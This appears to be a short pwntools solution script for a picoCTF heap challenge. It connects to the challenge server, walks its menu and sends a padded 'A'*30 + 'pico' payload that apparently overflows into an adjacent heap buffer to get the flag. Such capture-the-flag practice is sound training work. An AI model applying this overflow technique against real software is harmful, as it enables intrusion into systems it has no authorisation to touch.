from pwn import *

HOST, PORT = 'tethys.picoctf.net', 57770
r = remote(HOST, PORT)
# r = process("./chall")

r.sendlineafter(b'choice: ', b'5')
r.sendlineafter(b'choice: ', b'2')
r.sendlineafter(b'allocation: ', b'35')
r.sendlineafter(b'flag: ', b'A' * 30 + b'pico')
r.sendline(b'4')

r.interactive()